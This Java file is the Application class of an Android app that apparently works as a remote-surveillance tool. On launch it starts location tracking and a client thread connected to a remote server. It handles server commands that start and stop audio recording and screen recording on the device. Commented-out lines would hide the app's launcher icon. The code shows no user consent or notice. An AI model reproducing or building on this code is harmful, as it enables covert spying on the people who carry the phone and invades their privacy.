package com.view.core;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.view.core.activitys.MainActivity;
import com.view.core.activitys.PhoneRecordActivity;
import com.view.core.activitys.ScreenRecordActivity;
import com.view.core.services.ScreenUtil;
import com.view.core.thread.ClientThread;
import com.view.core.thread.Constant;
import com.view.core.thread.OnClientListener;
import com.view.core.utils.LocationUtil;

/**
 * @author: yechenyu
 * @create: 2019/12/25 下午8:53
 * @email: Yecynull@163.com
 * @version:
 * @descripe:
 **/
public class MyApplication extends Application {

    private static final String TAG = MyApplication.class.getSimpleName();

    private Context mContext ;
    private Handler mHandler = new Handler();
    private ClientThread mClientThread = null;
    private ServiceConnection mPhoneServiceConnection;
    private ServiceConnection mScreenServiceConnection;

    @Override
    public void onCreate() {
        super.onCreate();
        mContext = this;
//        PackageManager pm = getPackageManager();
//        ComponentName component = new ComponentName(getApplicationContext(), MainActivity.class);
//        pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                PackageManager.DONT_KILL_APP);

        LocationUtil.getInstance().initLocationManager(this);

        if(mClientThread == null) {
            mClientThread = new ClientThread(this, mHandler, mListener);
            mClientThread.start();
        }
    }

    public ClientThread getRemoteClient(){
        if(mClientThread == null){
            mClientThread = new ClientThread(this, mHandler, mListener);
            mClientThread.start();
        }
        return mClientThread;
    }

    public void setPhoneServiceConnection(ServiceConnection connection){
        mPhoneServiceConnection = connection;
    }

    public void setScreenServiceConnection(ServiceConnection connection){
        mScreenServiceConnection = connection;
    }

    public ServiceConnection getPhoneServiceConnection(){
        return mPhoneServiceConnection;
    }

    public ServiceConnection getScreenServiceConnection(){
        return mScreenServiceConnection;
    }

    private OnClientListener mListener = new OnClientListener() {

        @Override
        public void onStartConnect() {
        }

        @Override
        public void onConnected(final String host, final int ip) {
            if(Constant.isDebug) {
                mHandler.post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(mContext, ("服务器，" + host), Toast.LENGTH_SHORT).show();
                    }
                });
            }
        }

        @Override
        public void onAuthenticateFailed() {

        }

        @Override
        public void onAuthenticateSuccess() {

        }

        @Override
        public void onCommand(String cmd, String json) {
            Log.d(TAG, "onCommand: cmd="+ cmd+ ", json="+ json);
            if(cmd.equals(Constant.CMD_FETCH_REMOTE_DEVICE)){
                Intent intent = new Intent();
                intent.setClass(mContext, MainActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_OPERA)){
                if(mPhoneServiceConnection != null){
                    unbindService(mPhoneServiceConnection);
                }
                if(mScreenServiceConnection != null){
                    unbindService(mScreenServiceConnection);
                }


            /**
             * 开启录音
              */
            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_PHONE)){
                Intent intent = new Intent();
                intent.setClass(mContext, PhoneRecordActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_PHONE)){
                if(mPhoneServiceConnection != null){
                    Log.d(TAG, "onCommand: unbindservice");
//                    unbindService(mPhoneServiceConnection);
                }



            /**
             * 开启录音
             */
            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_SCREEN)){
                Intent intent = new Intent();
                intent.setClass(mContext, ScreenRecordActivity.class);
                intent.setPackage(getPackageName());
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Bundle bundle = new Bundle();
                bundle.putString(Constant.KEY_HOSTNAME, json);
                intent.putExtra("data", bundle);
                startActivity(intent);
            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_SCREEN)){
                if(mScreenServiceConnection != null){
                    Log.d(TAG, "onCommand: unbindservice");
                    ScreenUtil.stopScreenRecord(mContext);
                }
            }
        }

        @Override
        public void onConnectionFailed(String message) {

        }

        @Override
        public void onError(int errCode, String errMessage) {

        }
    };

    @Override
    public void onTerminate(){
        super.onTerminate();
        LocationUtil.getInstance().destoryLocationManager();
    }

}
